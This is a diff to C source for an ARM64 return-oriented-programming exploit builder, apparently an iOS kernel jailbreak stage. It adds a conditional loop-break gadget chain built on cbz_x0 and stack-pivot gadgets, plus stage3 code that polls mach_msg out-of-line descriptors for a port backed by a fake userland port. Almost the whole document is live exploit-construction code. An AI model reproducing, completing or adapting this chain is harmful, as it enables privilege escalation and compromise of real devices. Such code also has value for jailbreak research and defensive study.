@@ -133,6 +133,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 				char * loop_buf_name = (char*)next->value;
 				// get the length we need from one ROP_LOOP_BREAK in the chain
 				int chain_per_break = 0;
+				int chain_for_loop_end = 0;
 				{
 						// setup rop chain generator
 						rop_gadget_t * prev = NULL;
@@ -150,11 +151,13 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						// pivot the stack to where we want it
 						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
 						chain_per_break = ropchain_len * 8;
+						chain_for_loop_end = chain_per_break;
+						chain_per_break += 36*8; // add the if monster below
 				}
 				int loop_size = 0;
 				rop_gadget_t * lookahead_gadget = next->next;
 				while (lookahead_gadget != NULL) {
-					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_per_break;break;}
+					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_for_loop_end;break;}
 					if (lookahead_gadget->type == ROP_LOOP_BREAK) {loop_size += chain_per_break;}
 					else {loop_size += 8;}
 					if (lookahead_gadget->type == ROP_LOOP_START) {printf("inner loops aren't supported atm\n");exit(1);}
@@ -172,13 +175,13 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->next = NULL;
 						curr_gadget->type = NONE;
 						curr_gadget->comment = NULL;
-						int ropchain_len = 0;
+						int ropchain_len = chain_pos/8;
 						int rop_var_tmp_nr = 0;
 						
 						CALL_FUNC_RET_SAVE_VAR(loop_buf_name,get_addr_from_name("malloc"),loop_size,0,0,0,0,0,0,0);
 
 						ROP_VAR_ARG64(loop_buf_name,1);
-						chain_start = chain_pos + offsets->stage3_base + ropchain_len*8 + 16*8; /* to get behind that memcpy call */
+						chain_start = chain_pos + offsets->stage3_base + (ropchain_len*8-chain_pos) + 16*8; /* to get behind that memcpy call */
 						CALL_FUNC(get_addr_from_name("memcpy"),0,chain_start,loop_size,0,0,0,0,0);
 
 						curr_gadget->next = bck_next;
@@ -186,6 +189,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 
 				// replace all the ROP_LOOP_BREAK gadgets with the chain
 				lookahead_gadget = next;
+				uint64_t lookahead_pos = chain_pos;
 				while (lookahead_gadget != NULL) {
 					if (lookahead_gadget->type == ROP_LOOP_END) {
 						// setup rop chain generator
@@ -195,7 +199,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->next = NULL;
 						curr_gadget->type = NONE;
 						curr_gadget->comment = NULL;
-						int ropchain_len = 0;
+						int ropchain_len = lookahead_pos/8;
 						int rop_var_tmp_nr = 0;
 						
 						
@@ -208,8 +212,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						CALL_FUNC(offsets->stack_pivot,0,chain_start,0,0,0,0,0,0);
 						curr_gadget->next = bck_next;
 						break;
-					}
-					if (lookahead_gadget->type == ROP_LOOP_BREAK) {
+					} else if (lookahead_gadget->type == ROP_LOOP_BREAK) {
 						// setup rop chain generator
 						rop_gadget_t * prev = NULL;
 						rop_gadget_t * curr_gadget = lookahead_gadget;
@@ -217,9 +220,52 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->next = NULL;
 						curr_gadget->type = NONE;
 						curr_gadget->comment = NULL;
-						int ropchain_len = 0;
+						int ropchain_len = lookahead_pos/8;
 						int rop_var_tmp_nr = 0;
 						
+						/* TLDR on what that monster does:
+						 * jumps to the cbz_x0_gadget which will then jump to the str_x0_x19 gadget if x0 isn't set.
+						 * if it's nonezero, the str_x0_x19 gadget will misalign the stack by 4
+						 * after that we use the beast gadget again to load the vars, but because of stack misalignment we can now do two different things
+						 * if we are zero we call the stack pivot from longjump to get us passed the two calls (free/pivot)
+						 * if we are nonezero we basically do nothing and because of that run into the free and pivot calls
+						 */
+					    ADD_GADGET(); 
+						ADD_GADGET(); 
+						ADD_GADGET(); /* d9 */ 
+						ADD_GADGET(); /* d8 */ 
+						ADD_GADGET(); /* x28 */
+						ADD_CODE_GADGET(offsets->cbz_x0_gadget); /* x27 */ 
+						ADD_GADGET(); /* x26 */ 
+						ADD_GADGET(); /* x25 */
+						ADD_GADGET(); /* x24 */
+						ADD_GADGET(); /* x23 */
+						ADD_GADGET(); /* x22 */
+						ADD_GADGET(); /* x21 */
+						ADD_GADGET(); /* x20 */
+						ADD_REL_OFFSET_GADGET(-offsets->str_x0_gadget_offset); /* x19 pointing to itself, cause we will use the str x0 gadget as a regloader so we have to make sure we store somewhere save */ 
+						ADD_GADGET(); /* x29 */ 
+						ADD_CODE_GADGET(offsets->BEAST_GADGET_CALL_ONLY); /* x30 */ 	
+					    ADD_GADGET(); /* x19 (if nonezero) */ 
+					    ADD_GADGET(); /* x20 (if nonezero) */
+					    ADD_GADGET(); /* x29 (if nonezero) d9 (if zero) */ 
+					    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (if nonzero) d8 (if zero) */
+					    ADD_GADGET(); /* x28 (if zero) */ 
+					    ADD_CODE_GADGET(offsets->stack_pivot); /* x27 (if zero) */ 
+						ADD_GADGET(); /* d9  (not 0) x26 (0) */
+						ADD_GADGET(); /* d8  (not 0) x25 (0) */
+						ADD_REL_OFFSET_GADGET(88/*our own chain*/+chain_for_loop_end /*the two calls below*/); /* x28 (not 0) x24 (0) */
+					    ADD_GADGET(); /* x27 (not 0) x23 (0) */
+					    ADD_GADGET(); /* x26 (not 0) x22 (0) */
+					    ADD_GADGET(); /* x25 (not 0) x21 (0) */
+					    ADD_GADGET(); /* x24 (not 0) x20 (0) */
+					    ADD_GADGET(); /* x23 (not 0) x19 (0) */
+					    ADD_GADGET(); /* x22 (not 0) x29 (0) */
+					    ADD_CODE_GADGET(offsets->BEAST_GADGET); /* x21 (not 0) x30 (0) */
+					    ADD_GADGET(); /* x20 (not 0) */
+					    ADD_GADGET(); /* x19 (not 0) */
+						ADD_GADGET(); /* x29 (not 0) */
+						ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (not 0) */
 						
 						// free the buf we allocated for the loop
 						ROP_VAR_ARG64(loop_buf_name,1);
@@ -228,7 +274,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						// pivot the stack to where we want it
 						CALL_FUNC(offsets->stack_pivot,0,chain_start+loop_size,0,0,0,0,0,0);
 						curr_gadget->next = bck_next;
-					}
+					}else {lookahead_pos += 8;}
 					lookahead_gadget = lookahead_gadget->next;
 				}
 
@@ -340,6 +386,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 				char * loop_buf_name = (char*)next->value;
 				// get the length we need from one ROP_LOOP_BREAK in the chain
 				int chain_per_break = 0;
+				int chain_loop_end = 0;
 				{
 						// setup rop chain generator
 						rop_gadget_t * prev = NULL;
@@ -357,11 +404,13 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						// pivot the stack to where we want it
 						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
 						chain_per_break = ropchain_len * 8;
+						chain_loop_end = chain_per_break; // same up until here
+						chain_per_break += 36*8; // add the if monster chain from below
 				}
 				int loop_size = 0;
 				rop_gadget_t * lookahead_gadget = next->next;
 				while (lookahead_gadget != NULL) {
-					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_per_break; break;}
+					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_loop_end; break;}
 					if (lookahead_gadget->type == ROP_LOOP_BREAK) {loop_size += chain_per_break;}
 					else {loop_size += 8;}
 					if (lookahead_gadget->type == ROP_LOOP_START) {printf("inner loops aren't supported atm\n");exit(1);}
@@ -379,7 +428,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->next = NULL;
 						curr_gadget->type = NONE;
 						curr_gadget->comment = NULL;
-						int ropchain_len = 0;
+						int ropchain_len = (current_addr-offsets->stage3_base)/8;
 						int rop_var_tmp_nr = 0;
 						
 						ADD_COMMENT("malloced a buffer where we will copy the loop");
@@ -387,7 +436,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 
 						ADD_COMMENT("Copy the loop");
 						ROP_VAR_ARG64(loop_buf_name,1);
-						chain_start = current_addr + ropchain_len*8 + 16*8; /* to get behind that memcpy call */
+						chain_start = current_addr + (ropchain_len*8-(current_addr-offsets->stage3_base)) + 16*8; /* to get behind that memcpy call */
 						CALL_FUNC(get_addr_from_name("memcpy"),0,chain_start,loop_size,0,0,0,0,0);
 
 						curr_gadget->next = bck_next;
@@ -395,6 +444,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 
 				// replace all the ROP_LOOP_BREAK gadgets with the chain
 				lookahead_gadget = next;
+				uint64_t lookahead_pos = (current_addr-offsets->stage3_base)/8;
 				while (lookahead_gadget != NULL) {
 					if (lookahead_gadget->type == ROP_LOOP_END) {
 						// setup rop chain generator
@@ -404,7 +454,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->next = NULL;
 						curr_gadget->type = NONE;
 						curr_gadget->comment = NULL;
-						int ropchain_len = 0;
+						int ropchain_len = lookahead_pos/8;
 						int rop_var_tmp_nr = 0;
 						
 						
@@ -418,8 +468,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						
 						curr_gadget->next = bck_next;
 						break;
-					}
-					if (lookahead_gadget->type == ROP_LOOP_BREAK) {
+					} else if (lookahead_gadget->type == ROP_LOOP_BREAK) {
 						// setup rop chain generator
 						rop_gadget_t * prev = NULL;
 						rop_gadget_t * curr_gadget = lookahead_gadget;
@@ -427,9 +476,53 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->next = NULL;
 						curr_gadget->type = NONE;
 						curr_gadget->comment = NULL;
-						int ropchain_len = 0;
+						int ropchain_len = lookahead_pos/8;
 						int rop_var_tmp_nr = 0;
-						
+
+						/* TLDR on what that monster does:
+						 * jumps to the cbz_x0_gadget which will then jump to the str_x0_x19 gadget if x0 isn't set.
+						 * if it's nonezero, the str_x0_x19 gadget will misalign the stack by 4
+						 * after that we use the beast gadget again to load the vars, but because of stack misalignment we can now do two different things
+						 * if we are zero we call the stack pivot from longjump to get us passed the two calls (free/pivot)
+						 * if we are nonezero we basically do nothing and because of that run into the free and pivot calls
+						 */
+					    ADD_GADGET(); 
+						ADD_GADGET(); 
+						ADD_GADGET(); /* d9 */ 
+						ADD_GADGET(); /* d8 */ 
+						ADD_GADGET(); /* x28 */
+						ADD_CODE_GADGET(offsets->cbz_x0_gadget); /* x27 */ 
+						ADD_GADGET(); /* x26 */ 
+						ADD_GADGET(); /* x25 */
+						ADD_GADGET(); /* x24 */
+						ADD_GADGET(); /* x23 */
+						ADD_GADGET(); /* x22 */
+						ADD_GADGET(); /* x21 */
+						ADD_GADGET(); /* x20 */
+						ADD_REL_OFFSET_GADGET(-offsets->str_x0_gadget_offset); /* x19 pointing to itself, cause we will use the str x0 gadget as a regloader so we have to make sure we store somewhere save */ 
+						ADD_GADGET(); /* x29 */ 
+						ADD_CODE_GADGET(offsets->BEAST_GADGET_CALL_ONLY); /* x30 */ 	
+					    ADD_GADGET(); /* x19 (if nonezero) */ 
+					    ADD_GADGET(); /* x20 (if nonezero) */
+					    ADD_GADGET(); /* x29 (if nonezero) d9 (if zero) */ 
+					    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (if nonzero) d8 (if zero) */
+					    ADD_GADGET(); /* x28 (if zero) */ 
+					    ADD_CODE_GADGET(offsets->stack_pivot); /* x27 (if zero) */ 
+						ADD_GADGET(); /* d9  (not 0) x26 (0) */
+						ADD_GADGET(); /* d8  (not 0) x25 (0) */
+						ADD_REL_OFFSET_GADGET(88/*our own chain*/+chain_loop_end /*the two calls below*/); /* x28 (not 0) x24 (0) */
+					    ADD_GADGET(); /* x27 (not 0) x23 (0) */
+					    ADD_GADGET(); /* x26 (not 0) x22 (0) */
+					    ADD_GADGET(); /* x25 (not 0) x21 (0) */
+					    ADD_GADGET(); /* x24 (not 0) x20 (0) */
+					    ADD_GADGET(); /* x23 (not 0) x19 (0) */
+					    ADD_GADGET(); /* x22 (not 0) x29 (0) */
+					    ADD_CODE_GADGET(offsets->BEAST_GADGET); /* x21 (not 0) x30 (0) */
+					    ADD_GADGET(); /* x20 (not 0) */
+					    ADD_GADGET(); /* x19 (not 0) */
+						ADD_GADGET(); /* x29 (not 0) */
+						ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (not 0) */
+
 						
 						// free the buf we allocated for the loop
 						ADD_COMMENT("free the copy of our loop");
@@ -440,7 +533,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						// pivot the stack to where we want it
 						CALL_FUNC(offsets->stack_pivot,0,chain_start+loop_size,0,0,0,0,0,0);
 						curr_gadget->next = bck_next;
-					}
+					}else{lookahead_pos += 8;}
 					lookahead_gadget = lookahead_gadget->next;
 				}
 
@@ -519,6 +612,8 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	char * tmp = malloc(100);
 	DEFINE_ROP_VAR("msg_port",sizeof(mach_port_t),tmp); // the port which we use to send and recieve the message
 	DEFINE_ROP_VAR("tmp_port",sizeof(mach_port_t),tmp); // the port which has to be in the message which we send to the kernel
+	DEFINE_ROP_VAR("the_one",sizeof(mach_port_t),tmp); // the port to which we have a fakeport in userland
+	DEFINE_ROP_VAR("desc_addr",8,tmp); // pointer to the port buffer
 
 	ool_message_struct * ool_message = malloc(sizeof(ool_message_struct));
 	ool_message->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
@@ -610,7 +705,23 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 		ROP_VAR_ARG64("msg_port",5);
 		CALL("mach_msg",0,MACH_RCV_MSG,0,sizeof(ool_message_struct),0,0,0,0);
 
-		// TODO: check if (*ool_msg_recv.desc[0].address)[0] != MACH_PORT_NULL
+
+		// check if we found a port:
+
+		// copy the descriptor address into it's own var
+		ROP_VAR_ARG_W_OFFSET("ool_msg_recv",2,0 /*FIXME: this has to be .desc[0].address*/);
+		ROP_VAR_ARG("desc_addr",1);
+		CALL("memcpy",0,0,8,0,0,0,0,0);
+
+		// copy the first 8 bytes at the descriptor address into the_one
+		ROP_VAR_ARG("the_one",1);
+		ROP_VAR_ARG64("desc_addr",2);
+		CALL("memcpy",0,0,8,0,0,0,0,0);
+
+		// set x0 to the_one
+		SET_X0_FROM_ROP_VAR("the_one");
+		// break out of the loop if x0 is nonzero
+		ADD_LOOP_BREAK_IF_X0_NONZERO("main_loop");
 
 	ADD_LOOP_END();
 
